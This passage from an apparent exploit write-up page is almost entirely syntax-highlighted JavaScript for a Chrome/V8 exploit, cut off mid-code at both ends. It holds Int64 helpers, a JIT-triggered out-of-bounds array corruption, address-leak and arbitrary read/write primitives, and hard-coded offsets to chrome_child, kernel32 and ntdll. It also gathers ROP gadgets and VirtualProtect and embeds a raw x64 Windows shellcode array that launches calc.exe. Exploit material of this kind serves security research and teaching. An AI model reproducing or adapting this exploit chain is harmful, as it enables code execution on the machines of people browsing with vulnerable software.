class="actionscript">    <span class="keyword">this</span>.assignNeg = operation(<span class="function"><span class="keyword">function</span> <span class="title">neg</span><span class="params">(n)</span> </span>&#123;</span></span><br><span class="line"><span class="actionscript">        <span class="keyword">for</span> (<span class="keyword">var</span> i = <span class="number">0</span>; i &lt; <span class="number">8</span>; i++)</span></span><br><span class="line">            bytes[i] = ~n.byteAt(i);</span><br><span class="line"></span><br><span class="line"><span class="actionscript">        <span class="keyword">return</span> <span class="keyword">this</span>.assignAdd(<span class="keyword">this</span>, Int64.One);</span></span><br><span class="line">    &#125;, 1);</span><br><span class="line"></span><br><span class="line"><span class="actionscript">    <span class="comment">// this = a + b</span></span></span><br><span class="line"><span class="actionscript">    <span class="keyword">this</span>.assignAdd = operation(<span class="function"><span class="keyword">function</span> <span class="title">add</span><span class="params">(a, b)</span> </span>&#123;</span></span><br><span class="line"><span class="actionscript">        <span class="keyword">var</span> carry = <span class="number">0</span>;</span></span><br><span class="line"><span class="actionscript">        <span class="keyword">for</span> (<span class="keyword">var</span> i = <span class="number">0</span>; i &lt; <span class="number">8</span>; i++) &#123;</span></span><br><span class="line"><span class="actionscript">            <span class="keyword">var</span> cur = a.byteAt(i) + b.byteAt(i) + carry;</span></span><br><span class="line">            carry = cur &gt; 0xff | 0;</span><br><span class="line">            bytes[i] = cur;</span><br><span class="line">        &#125;</span><br><span class="line"><span class="actionscript">        <span class="keyword">return</span> <span class="keyword">this</span>;</span></span><br><span class="line">    &#125;, 2);</span><br><span class="line"></span><br><span class="line"><span class="actionscript">    <span class="comment">// this = a - b</span></span></span><br><span class="line"><span class="actionscript">    <span class="keyword">this</span>.assignSub = operation(<span class="function"><span class="keyword">function</span> <span class="title">sub</span><span class="params">(a, b)</span> </span>&#123;</span></span><br><span class="line"><span class="actionscript">        <span class="keyword">var</span> carry = <span class="number">0</span>;</span></span><br><span class="line"><span class="actionscript">        <span class="keyword">for</span> (<span class="keyword">var</span> i = <span class="number">0</span>; i &lt; <span class="number">8</span>; i++) &#123;</span></span><br><span class="line"><span class="actionscript">            <span class="keyword">var</span> cur = a.byteAt(i) - b.byteAt(i) - carry;</span></span><br><span class="line">            carry = cur &lt; 0 | 0;</span><br><span class="line">            bytes[i] = cur;</span><br><span class="line">        &#125;</span><br><span class="line"><span class="actionscript">        <span class="keyword">return</span> <span class="keyword">this</span>;</span></span><br><span class="line">    &#125;, 2);</span><br><span class="line"></span><br><span class="line"><span class="actionscript">    <span class="comment">// this = a &amp; b</span></span></span><br><span class="line"><span class="actionscript">    <span class="keyword">this</span>.assignAnd = operation(<span class="function"><span class="keyword">function</span> <span class="title">and</span><span class="params">(a, b)</span> </span>&#123;</span></span><br><span class="line"><span class="actionscript">        <span class="keyword">for</span> (<span class="keyword">var</span> i = <span class="number">0</span>; i &lt; <span class="number">8</span>; i++) &#123;</span></span><br><span class="line">            bytes[i] = a.byteAt(i) &amp; b.byteAt(i);</span><br><span class="line">        &#125;</span><br><span class="line"><span class="actionscript">        <span class="keyword">return</span> <span class="keyword">this</span>;</span></span><br><span class="line">    &#125;, 2);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="actionscript"><span class="comment">// Constructs a new Int64 instance with the same bit representation as the provided double.</span></span></span><br><span class="line"><span class="actionscript">Int64.fromDouble = <span class="function"><span class="keyword">function</span><span class="params">(d)</span> </span>&#123;</span></span><br><span class="line"><span class="actionscript">    <span class="keyword">var</span> bytes = Struct.pack(Struct.float64, d);</span></span><br><span class="line"><span class="actionscript">    <span class="keyword">return</span> <span class="keyword">new</span> Int64(bytes);</span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="actionscript"><span class="comment">// Convenience functions. These allocate a new Int64 to hold the result.</span></span></span><br><span class="line"></span><br><span class="line"><span class="actionscript"><span class="comment">// Return -n (two's complement)</span></span></span><br><span class="line"><span class="actionscript"><span class="function"><span class="keyword">function</span> <span class="title">Neg</span><span class="params">(n)</span> </span>&#123;</span></span><br><span class="line"><span class="actionscript">    <span class="keyword">return</span> (<span class="keyword">new</span> Int64()).assignNeg(n);</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="actionscript"><span class="comment">// Return a + b</span></span></span><br><span class="line"><span class="actionscript"><span class="function"><span class="keyword">function</span> <span class="title">Add</span><span class="params">(a, b)</span> </span>&#123;</span></span><br><span class="line"><span class="actionscript">    <span class="keyword">return</span> (<span class="keyword">new</span> Int64()).assignAdd(a, b);</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="actionscript"><span class="comment">// Return a - b</span></span></span><br><span class="line"><span class="actionscript"><span class="function"><span class="keyword">function</span> <span class="title">Sub</span><span class="params">(a, b)</span> </span>&#123;</span></span><br><span class="line"><span class="actionscript">    <span class="keyword">return</span> (<span class="keyword">new</span> Int64()).assignSub(a, b);</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="actionscript"><span class="comment">// Return a &amp; b</span></span></span><br><span class="line"><span class="actionscript"><span class="function"><span class="keyword">function</span> <span class="title">And</span><span class="params">(a, b)</span> </span>&#123;</span></span><br><span class="line"><span class="actionscript">    <span class="keyword">return</span> (<span class="keyword">new</span> Int64()).assignAnd(a, b);</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="actionscript"><span class="function"><span class="keyword">function</span> <span class="title">hex</span><span class="params">(a)</span> </span>&#123;</span></span><br><span class="line"><span class="actionscript">    <span class="keyword">if</span> (a == <span class="literal">undefined</span>) <span class="keyword">return</span> <span class="string">"0xUNDEFINED"</span>;</span></span><br><span class="line"><span class="actionscript">    <span class="keyword">var</span> ret = a.toString(<span class="number">16</span>);</span></span><br><span class="line"><span class="actionscript">    <span class="keyword">if</span> (ret.substr(<span class="number">0</span>,<span class="number">2</span>) != <span class="string">"0x"</span>) <span class="keyword">return</span> <span class="string">"0x"</span>+ret;</span></span><br><span class="line"><span class="actionscript">    <span class="keyword">else</span> <span class="keyword">return</span> ret;</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="actionscript"><span class="function"><span class="keyword">function</span> <span class="title">lower</span><span class="params">(x)</span> </span>&#123;</span></span><br><span class="line"><span class="actionscript">    <span class="comment">// returns the lower 32bit of double x</span></span></span><br><span class="line"><span class="javascript">    <span class="keyword">return</span> <span class="built_in">parseInt</span>((<span class="string">"0000000000000000"</span> + Int64.fromDouble(x).toString()).substr(<span class="number">-8</span>,<span class="number">8</span>),<span class="number">16</span>) | <span class="number">0</span>;</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="actionscript"><span class="function"><span class="keyword">function</span> <span class="title">upper</span><span class="params">(x)</span> </span>&#123;</span></span><br><span class="line"><span class="actionscript">    <span class="comment">// returns the upper 32bit of double x</span></span></span><br><span class="line"><span class="javascript">    <span class="keyword">return</span> <span class="built_in">parseInt</span>((<span class="string">"0000000000000000"</span> + Int64.fromDouble(x).toString()).substr(<span class="number">-16</span>, <span class="number">8</span>),<span class="number">16</span>) | <span class="number">0</span>;</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="actionscript"><span class="function"><span class="keyword">function</span> <span class="title">lowerint</span><span class="params">(x)</span> </span>&#123;</span></span><br><span class="line"><span class="actionscript">    <span class="comment">// returns the lower 32bit of int x</span></span></span><br><span class="line"><span class="javascript">    <span class="keyword">return</span> <span class="built_in">parseInt</span>((<span class="string">"0000000000000000"</span> + x.toString(<span class="number">16</span>)).substr(<span class="number">-8</span>,<span class="number">8</span>),<span class="number">16</span>) | <span class="number">0</span>;</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="actionscript"><span class="function"><span class="keyword">function</span> <span class="title">upperint</span><span class="params">(x)</span> </span>&#123;</span></span><br><span class="line"><span class="actionscript">    <span class="comment">// returns the upper 32bit of int x</span></span></span><br><span class="line"><span class="javascript">    <span class="keyword">return</span> <span class="built_in">parseInt</span>((<span class="string">"0000000000000000"</span> + x.toString(<span class="number">16</span>)).substr(<span class="number">-16</span>, <span class="number">8</span>),<span class="number">16</span>) | <span class="number">0</span>;</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="actionscript"><span class="function"><span class="keyword">function</span> <span class="title">combine</span><span class="params">(a, b)</span> </span>&#123;</span></span><br><span class="line"><span class="actionscript">    <span class="comment">//a = a &gt;&gt;&gt; 0;</span></span></span><br><span class="line"><span class="actionscript">    <span class="comment">//b = b &gt;&gt;&gt; 0;</span></span></span><br><span class="line"><span class="actionscript">    <span class="comment">//console.log(a.toString());</span></span></span><br><span class="line"><span class="actionscript">    <span class="comment">//console.log(b.toString());</span></span></span><br><span class="line"><span class="javascript">    <span class="keyword">return</span> <span class="built_in">parseInt</span>(Int64.fromDouble(b).toString() + Int64.fromDouble(a).toString(), <span class="number">16</span>);</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="actionscript"><span class="comment">//padLeft用于字符串左补位</span></span></span><br><span class="line"></span><br><span class="line"><span class="actionscript"><span class="function"><span class="keyword">function</span> <span class="title">combineint</span><span class="params">(a, b)</span> </span>&#123;</span></span><br><span class="line"><span class="actionscript">    <span class="comment">//a = a &gt;&gt;&gt; 0;</span></span></span><br><span class="line"><span class="actionscript">    <span class="comment">//b = b &gt;&gt;&gt; 0;</span></span></span><br><span class="line"><span class="javascript">    <span class="keyword">return</span> <span class="built_in">parseInt</span>(b.toString(<span class="number">16</span>).substr(<span class="number">-8</span>,<span class="number">8</span>) + (a.toString(<span class="number">16</span>)).padLeft(<span class="number">8</span>), <span class="number">16</span>);</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="actionscript"><span class="function"><span class="keyword">function</span> <span class="title">gc</span><span class="params">()</span></span>&#123;</span></span><br><span class="line"><span class="actionscript">  <span class="keyword">for</span> (<span class="keyword">var</span> i = <span class="number">0</span>; i &lt; <span class="number">1024</span> * <span class="number">1024</span> * <span class="number">16</span>; i++)&#123;</span></span><br><span class="line"><span class="javascript">    <span class="keyword">new</span> <span class="built_in">String</span>();</span></span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="actionscript"><span class="function"><span class="keyword">function</span> <span class="title">clear_space</span><span class="params">()</span></span>&#123;</span></span><br><span class="line">  gc();</span><br><span class="line">  gc();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="actionscript"><span class="function"><span class="keyword">function</span> <span class="title">get_shell</span><span class="params">()</span></span>&#123;</span></span><br><span class="line"><span class="actionscript">    <span class="keyword">return</span> <span class="number">1</span> + <span class="number">1</span>;</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="actionscript"><span class="keyword">var</span> leak = get_shell;</span></span><br><span class="line"><span class="actionscript"><span class="function"><span class="keyword">function</span> <span class="title">fun</span><span class="params">(arg)</span> </span>&#123;</span></span><br><span class="line"><span class="javascript">    <span class="keyword">let</span> x = <span class="built_in">arguments</span>.length;</span></span><br><span class="line"><span class="javascript">    a1 = <span class="keyword">new</span> <span class="built_in">Array</span>(<span class="number">0x10</span>);</span></span><br><span class="line">    a1[0] = 1.1;</span><br><span class="line"><span class="javascript">    oob_double_Array = <span class="keyword">new</span> <span class="built_in">Array</span>(<span class="number">0x10</span>);</span></span><br><span class="line">    oob_double_Array[0] = 1.1;</span><br><span class="line"><span class="javascript">    object_Array = <span class="keyword">new</span> <span class="built_in">Array</span>(<span class="number">0x10</span>);</span></span><br><span class="line">    object_Array[0] = &#123;&#125;;</span><br><span class="line">    object_Array[1] = leak;</span><br><span class="line">    x = x &gt;&gt; 16</span><br><span class="line"><span class="actionscript">    a1[x * <span class="number">19</span>] = <span class="number">2.60750842793813e-310</span>;  <span class="comment">// 0xffff00000000</span></span></span><br><span class="line"><span class="actionscript">    a1[x * <span class="number">21</span>] = <span class="number">2.60750842793813e-310</span>;  <span class="comment">// 0x2a00000000</span></span></span><br><span class="line"><span class="actionscript">    a1[x * <span class="number">41</span>] = <span class="number">2.60750842793813e-310</span>;  <span class="comment">// 0x2a00000000</span></span></span><br><span class="line">&#125;</span><br><span class="line"><span class="actionscript"><span class="keyword">var</span> a1, oob_double_Array, object_Array, oob_buffer;</span></span><br><span class="line"><span class="actionscript"><span class="keyword">var</span> a3 = [<span class="number">1.1</span>,<span class="number">2.2</span>];</span></span><br><span class="line">a3.length = 0x11000;</span><br><span class="line">a3.fill(3.3);</span><br><span class="line"><span class="actionscript"><span class="keyword">var</span> a4 = [<span class="number">1.1</span>];</span></span><br><span class="line"><span class="javascript"><span class="keyword">for</span> (<span class="keyword">let</span> i = <span class="number">0</span>; i &lt; <span class="number">10000</span>; i++) fun(...a4);</span></span><br><span class="line"><span class="actionscript"><span class="comment">// %OptimizeFunctionOnNextCall(fun);</span></span></span><br><span class="line">fun(...a3);</span><br><span class="line"><span class="actionscript"><span class="comment">// console.log(a1.length);</span></span></span><br><span class="line"><span class="actionscript"><span class="comment">// console.log(oob_double_Array.length);</span></span></span><br><span class="line">/* for (var i = 0; i &lt; a1.length; i++)&#123;</span><br><span class="line"><span class="javascript">    <span class="built_in">console</span>.log(a1[i]);</span></span><br><span class="line">&#125;  */</span><br><span class="line"><span class="javascript"><span class="built_in">console</span>.log(<span class="string">"this is a2"</span>);</span></span><br><span class="line"></span><br><span class="line"><span class="actionscript"><span class="function"><span class="keyword">function</span> <span class="title">user_space_read</span><span class="params">(leak)</span></span>&#123;</span></span><br><span class="line">  object_Array[1] = leak;</span><br><span class="line"><span class="actionscript">  <span class="keyword">return</span> oob_double_Array[<span class="number">23</span>];</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="actionscript"><span class="function"><span class="keyword">function</span> <span class="title">writePtr</span><span class="params">(offset, address, value)</span></span>&#123;</span></span><br><span class="line">  oob_double_Array[offset] = address;</span><br><span class="line"><span class="javascript">  fake_dv = <span class="keyword">new</span> <span class="built_in">Float64Array</span>(oob_buffer);</span></span><br><span class="line">  fake_dv[0] = value;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="actionscript"><span class="function"><span class="keyword">function</span> <span class="title">readPtr</span><span class="params">(offset, address)</span></span>&#123;</span></span><br><span class="line">  oob_double_Array[offset] = address;</span><br><span class="line"><span class="javascript">  fake_dv = <span class="keyword">new</span> <span class="built_in">Float64Array</span>(oob_buffer);</span></span><br><span class="line"><span class="actionscript">  <span class="keyword">return</span> fake_dv[<span class="number">0</span>];</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">function_addr = oob_double_Array[23];</span><br><span class="line"><span class="javascript"><span class="built_in">console</span>.log(<span class="string">"[+] the get shell function addr is at "</span> + Int64.fromDouble(function_addr).toString());</span></span><br><span class="line"><span class="javascript">oob_buffer = <span class="keyword">new</span> <span class="built_in">ArrayBuffer</span>(<span class="number">0x1000</span>);</span></span><br><span class="line"></span><br><span class="line">%DebugPrint(get_shell);</span><br><span class="line">/* for (var i = 0; i &lt; oob_double_Array.length; i++)&#123;</span><br><span class="line"><span class="javascript">    <span class="built_in">console</span>.log(Int64.fromDouble(oob_double_Array[i]).toString());</span></span><br><span class="line">&#125; */</span><br><span class="line">%DebugPrint(a1);</span><br><span class="line">%DebugPrint(oob_double_Array);</span><br><span class="line">%DebugPrint(oob_buffer);</span><br><span class="line"></span><br><span class="line">oob_buffer_addr = user_space_read(oob_buffer);</span><br><span class="line"><span class="actionscript"><span class="comment">// alert("[+] the oob_buffer_addr is at " + Int64.fromDouble(oob_buffer_addr).toString());</span></span></span><br><span class="line"></span><br><span class="line">oob_array_addr = user_space_read(oob_double_Array);</span><br><span class="line"><span class="actionscript"><span class="comment">// alert("[+] the oob_array_addr is at " + Int64.fromDouble(oob_array_addr).toString());</span></span></span><br><span class="line"></span><br><span class="line"><span class="actionscript">temp1 = Int64.fromDouble(oob_buffer_addr + <span class="keyword">new</span> Int64(<span class="number">0x1f</span>).asDouble() - oob_array_addr + <span class="keyword">new</span> Int64(<span class="number">0x81</span>).asDouble());</span></span><br><span class="line"><span class="actionscript"><span class="comment">// alert("temp1 is " + temp1.toString())</span></span></span><br><span class="line"></span><br><span class="line">offset = lowerint(temp1) / 8;</span><br><span class="line"><span class="actionscript"><span class="comment">// alert("offset is " + offset.toString())</span></span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">/* object_Array[1] = oob_double_Array;</span><br><span class="line">oob_double_Array_addr = oob_double_Array[23];</span><br><span class="line"><span class="actionscript">alert(<span class="string">"[+] the oob_double_Array_addr is at "</span> + Int64.fromDouble(oob_double_Array_addr).toString());</span></span><br><span class="line"> */</span><br><span class="line"></span><br><span class="line"><span class="javascript"><span class="keyword">let</span> scratch = <span class="keyword">new</span> <span class="built_in">ArrayBuffer</span>(<span class="number">0x100000</span>);</span></span><br><span class="line"><span class="javascript"><span class="keyword">let</span> scratch_u8 = <span class="keyword">new</span> <span class="built_in">Uint8Array</span>(scratch);</span></span><br><span class="line"><span class="javascript"><span class="keyword">let</span> scratch_u64 = <span class="keyword">new</span> <span class="built_in">Float64Array</span>(scratch);</span></span><br><span class="line">scratch_u8.fill(0x41, 0, 10);</span><br><span class="line"></span><br><span class="line"><span class="actionscript"><span class="keyword">var</span> shellcode1 = [<span class="number">72</span>, <span class="number">131</span>, <span class="number">236</span>, <span class="number">40</span>, <span class="number">72</span>, <span class="number">131</span>, <span class="number">228</span>, <span class="number">240</span>, <span class="number">72</span>, <span class="number">199</span>, <span class="number">194</span>, <span class="number">96</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">101</span>, <span class="number">76</span>, <span class="number">139</span>, <span class="number">34</span>, <span class="number">77</span>, <span class="number">139</span>, <span class="number">100</span>, <span class="number">36</span>, <span class="number">24</span>, <span class="number">77</span>, <span class="number">139</span>, <span class="number">100</span>, <span class="number">36</span>, <span class="number">32</span>, <span class="number">77</span>, <span class="number">139</span>, <span class="number">36</span>, <span class="number">36</span>, <span class="number">77</span>, <span class="number">139</span>, <span class="number">36</span>, <span class="number">36</span>, <span class="number">77</span>, <span class="number">139</span>, <span class="number">100</span>, <span class="number">36</span>, <span class="number">32</span>, <span class="number">72</span>, <span class="number">186</span>, <span class="number">142</span>, <span class="number">78</span>, <span class="number">14</span>, <span class="number">236</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">73</span>, <span class="number">139</span>, <span class="number">204</span>, <span class="number">232</span>, <span class="number">102</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">235</span>, <span class="number">56</span>, <span class="number">89</span>, <span class="number">255</span>, <span class="number">208</span>, <span class="number">72</span>, <span class="number">199</span>, <span class="number">194</span>, <span class="number">152</span>, <span class="number">254</span>, <span class="number">138</span>, <span class="number">14</span>, <span class="number">73</span>, <span class="number">139</span>, <span class="number">204</span>, <span class="number">232</span>, <span class="number">82</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">72</span>, <span class="number">139</span>, <span class="number">216</span>, <span class="number">77</span>, <span class="number">51</span>, <span class="number">201</span>, <span class="number">235</span>, <span class="number">60</span>, <span class="number">65</span>, <span class="number">88</span>, <span class="number">235</span>, <span class="number">42</span>, <span class="number">90</span>, <span class="number">72</span>, <span class="number">139</span>, <span class="number">202</span>, <span class="number">255</span>, <span class="number">211</span>, <span class="number">72</span>, <span class="number">199</span>, <span class="number">194</span>, <span class="number">197</span>, <span class="number">181</span>, <span class="number">73</span>, <span class="number">17</span>, <span class="number">73</span>, <span class="number">139</span>, <span class="number">204</span>, <span class="number">232</span>, <span class="number">49</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">72</span>, <span class="number">51</span>, <span class="number">201</span>, <span class="number">255</span>, <span class="number">208</span>, <span class="number">232</span>, <span class="number">195</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">117</span>, <span class="number">115</span>, <span class="number">101</span>, <span class="number">114</span>, <span class="number">51</span>, <span class="number">50</span>, <span class="number">46</span>, <span class="number">100</span>, <span class="number">108</span>, <span class="number">108</span>, <span class="number">0</span>, <span class="number">232</span>, <span class="number">209</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">99</span>, <span class="number">97</span>, <span class="number">108</span>, <span class="number">99</span>, <span class="number">46</span>, <span class="number">101</span>, <span class="number">120</span>, <span class="number">101</span>, <span class="number">0</span>, <span class="number">232</span>, <span class="number">191</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">99</span>, <span class="number">97</span>, <span class="number">108</span>, <span class="number">99</span>, <span class="number">46</span>, <span class="number">101</span>, <span class="number">120</span>, <span class="number">101</span>, <span class="number">0</span>, <span class="number">76</span>, <span class="number">139</span>, <span class="number">233</span>, <span class="number">65</span>, <span class="number">139</span>, <span class="number">69</span>, <span class="number">60</span>, <span class="number">77</span>, <span class="number">139</span>, <span class="number">221</span>, <span class="number">76</span>, <span class="number">3</span>, <span class="number">232</span>, <span class="number">69</span>, <span class="number">139</span>, <span class="number">181</span>, <span class="number">136</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">77</span>, <span class="number">3</span>, <span class="number">243</span>, <span class="number">69</span>, <span class="number">139</span>, <span class="number">86</span>, <span class="number">24</span>, <span class="number">65</span>, <span class="number">139</span>, <span class="number">94</span>, <span class="number">32</span>, <span class="number">73</span>, <span class="number">3</span>, <span class="number">219</span>, <span class="number">103</span>, <span class="number">227</span>, <span class="number">60</span>, <span class="number">73</span>, <span class="number">255</span>, <span class="number">202</span>, <span class="number">66</span>, <span class="number">139</span>, <span class="number">52</span>, <span class="number">147</span>, <span class="number">73</span>, <span class="number">3</span>, <span class="number">243</span>, <span class="number">72</span>, <span class="number">51</span>, <span class="number">255</span>, <span class="number">72</span>, <span class="number">51</span>, <span class="number">192</span>, <span class="number">252</span>, <span class="number">172</span>, <span class="number">132</span>, <span class="number">192</span>, <span class="number">116</span>, <span class="number">7</span>, <span class="number">193</span>, <span class="number">207</span>, <span class="number">13</span>, <span class="number">3</span>, <span class="number">248</span>, <span class="number">235</span>, <span class="number">244</span>, <span class="number">59</span>, <span class="number">250</span>, <span class="number">117</span>, <span class="number">220</span>, <span class="number">65</span>, <span class="number">139</span>, <span class="number">94</span>, <span class="number">36</span>, <span class="number">73</span>, <span class="number">3</span>, <span class="number">219</span>, <span class="number">51</span>, <span class="number">201</span>, <span class="number">102</span>, <span class="number">66</span>, <span class="number">139</span>, <span class="number">12</span>, <span class="number">83</span>, <span class="number">65</span>, <span class="number">139</span>, <span class="number">94</span>, <span class="number">28</span>, <span class="number">73</span>, <span class="number">3</span>, <span class="number">219</span>, <span class="number">139</span>, <span class="number">4</span>, <span class="number">139</span>, <span class="number">73</span>, <span class="number">3</span>, <span class="number">195</span>, <span class="number">195</span>]</span></span><br><span class="line"></span><br><span class="line"><span class="javascript"><span class="keyword">let</span> shellcode = <span class="keyword">new</span> <span class="built_in">Uint8Array</span>(shellcode1.length);</span></span><br><span class="line"><span class="actionscript"><span class="keyword">for</span> (<span class="keyword">var</span> i = <span class="number">0</span>; i &lt; shellcode1.length; i++)&#123;</span></span><br><span class="line">  shellcode[i] = shellcode1[i];</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="javascript"><span class="keyword">let</span> div = <span class="built_in">document</span>.createElement(<span class="string">'div'</span>);</span></span><br><span class="line"><span class="javascript"><span class="keyword">let</span> div_addr = user_space_read(div);</span></span><br><span class="line"><span class="actionscript">alert(<span class="string">"[+] the div_addr is at "</span> + Int64.fromDouble(div_addr).toString());</span></span><br><span class="line"></span><br><span class="line"><span class="actionscript">el_addr = readPtr(offset, div_addr + <span class="keyword">new</span> Int64(<span class="number">0x1f</span>).asDouble());</span></span><br><span class="line"><span class="actionscript"><span class="comment">// alert("[+] the el_addr is at " + Int64.fromDouble(el_addr).toString());</span></span></span><br><span class="line"></span><br><span class="line">el_vftable = readPtr(offset, el_addr);</span><br><span class="line"><span class="actionscript"><span class="comment">// alert("[+] the leak is at " + Int64.fromDouble(leak).toString());</span></span></span><br><span class="line"></span><br><span class="line"><span class="actionscript">chrome_child_addr = el_vftable - (<span class="keyword">new</span> Int64(<span class="number">0x433e910</span>).asDouble());</span></span><br><span class="line"><span class="actionscript"><span class="comment">// alert("[+] the chrome_child_addr is at " + Int64.fromDouble(chrome_child_addr).toString());</span></span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="actionscript"><span class="comment">// kernel32_addr = readPtr(offset, chrome_child_addr + new Int64(0x49dbde8).asDouble()) - new Int64(0x20db0).asDouble();</span></span></span><br><span class="line"><span class="actionscript"><span class="comment">// x chrome_child!*CreateEventW*</span></span></span><br><span class="line"><span class="actionscript">kernel32_addr = readPtr(offset, chrome_child_addr + <span class="keyword">new</span> Int64(<span class="number">0x49db4f8</span>).asDouble()) - <span class="keyword">new</span> Int64(<span class="number">0x21f20</span>).asDouble();</span></span><br><span class="line"></span><br><span class="line"><span class="actionscript"><span class="comment">// alert("[+] the kernel32_addr is at " + Int64.fromDouble(kernel32_addr).toString());</span></span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="actionscript"><span class="comment">// ntdll_addr = readPtr(offset, kernel32_addr + new Int64(0x79208).asDouble()) - new Int64(0x9a9b0).asDouble();</span></span></span><br><span class="line"><span class="actionscript"><span class="comment">// 0:016&gt; x KERNEL32!*NtQueryEvent*</span></span></span><br><span class="line"><span class="actionscript">ntdll_addr = readPtr(offset, kernel32_addr + <span class="keyword">new</span> Int64(<span class="number">0x76fe8</span>).asDouble()) - <span class="keyword">new</span> Int64(<span class="number">0xa55d0</span>).asDouble();;</span></span><br><span class="line"><span class="actionscript"><span class="comment">// alert("[+] the ntdll_addr is at " + Int64.fromDouble(ntdll_addr).toString());</span></span></span><br><span class="line"></span><br><span class="line"><span class="actionscript"><span class="comment">// gadget = ntdll_addr + new Int64(0xA0715).asDouble();</span></span></span><br><span class="line"><span class="actionscript">gadget = ntdll_addr + <span class="keyword">new</span> Int64(<span class="number">0xAB9B5</span>).asDouble();</span></span><br><span class="line"><span class="actionscript"><span class="comment">// alert("[+] the gadget(mov     rdx, [rcx+50h]\n mov     rbp, [rcx+18h]\n mov     rsp, [rcx+10h]\n) is at " + Int64.fromDouble(gadget).toString());</span></span></span><br><span class="line"></span><br><span class="line"><span class="actionscript">pop_rcx_ret = chrome_child_addr + <span class="keyword">new</span> Int64(<span class="number">0x40982c</span>).asDouble();</span></span><br><span class="line"><span class="actionscript"><span class="comment">// alert("[+] the pop_rcx_ret is at " + Int64.fromDouble(pop_rcx_ret).toString());</span></span></span><br><span class="line"></span><br><span class="line"><span class="actionscript">pop_rdx_ret = chrome_child_addr + <span class="keyword">new</span> Int64(<span class="number">0x12d91a</span>).asDouble();</span></span><br><span class="line"><span class="actionscript"><span class="comment">// alert("[+] the pop_rdx_ret is at " + Int64.fromDouble(pop_rdx_ret).toString());</span></span></span><br><span class="line"></span><br><span class="line"><span class="actionscript">pop_r8_ret = chrome_child_addr + <span class="keyword">new</span> Int64(<span class="number">0x11b6012</span>).asDouble();</span></span><br><span class="line"><span class="actionscript"><span class="comment">// alert("[+] the pop_r8_ret is at " + Int64.fromDouble(pop_r8_ret).toString());</span></span></span><br><span class="line"></span><br><span class="line"><span class="actionscript">pop_r9_ret = chrome_child_addr + <span class="keyword">new</span> Int64(<span class="number">0x197b44c</span>).asDouble();</span></span><br><span class="line"><span class="actionscript"><span class="comment">// alert("[+] the pop_r9_ret is at " + Int64.fromDouble(pop_r9_ret).toString());</span></span></span><br><span class="line"></span><br><span class="line"><span class="actionscript"><span class="comment">// virtaulprotect_addr = kernel32_addr + new Int64(0x193d0).asDouble();</span></span></span><br><span class="line"> </span><br><span class="line"><span class="actionscript">virtaulprotect_addr = kernel32_addr + <span class="keyword">new</span> Int64(<span class="number">0x1B330</span>).asDouble();</span></span><br><span class="line"></span><br><span class="line"><span class="actionscript"><span class="comment">// alert("[+] the virtaulprotect_addr is at " + Int64.fromDouble(virtaulprotect_addr).toString());</span></span></span><br><span class="line"></span><br><span class="line">%DebugPrint(scratch);</span><br><span class="line"></span><br><span class="line">scratch_buffer_addr = user_space_read(scratch);</span><br><span class="line"><span class="actionscript"><span class="comment">// alert("[+] the scratch_buffer_addr is at " + Int64.fromDouble(scratch_buffer_addr).toString());</span></span></span><br><span class="line"></span><br><span class="line"><span class="javascript"><span class="keyword">let</span> scratch_addr = readPtr(offset, scratch_buffer_addr + <span class="keyword">new</span> Int64(<span class="number">0x1f</span>).asDouble());</span></span><br><span class="line"><span class="actionscript"><span class="comment">// alert("[+] the scratch_addr is at " + Int64.fromDouble(scratch_addr).toString());</span></span></span><br><span class="line"></span><br><span class="line">sc_upper = upper(scratch_addr);</span><br><span class="line">sc_lower = lower(scratch_addr);</span><br><span class="line">scratch_addr1 = combineint(sc_upper, sc_lower);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="javascript"><span class="keyword">let</span> sc_offset = <span class="number">0x20000</span> - scratch_addr1 % <span class="number">0x1000</span>;</span></span><br><span class="line"><span class="actionscript"><span class="comment">// alert("[+] the sc_offset is at 0x" + sc_offset.toString(16));</span></span></span><br><span class="line"></span><br><span class="line"><span class="javascript"><span class="keyword">let</span> sc_addr = scratch_addr + <span class="keyword">new</span> Int64(<span class="string">"0x"</span> + sc_offset.toString(<span class="number">16</span>)).asDouble();</span></span><br><span class="line"><span class="actionscript"><span class="comment">// alert("[+] the sc_addr is at " + 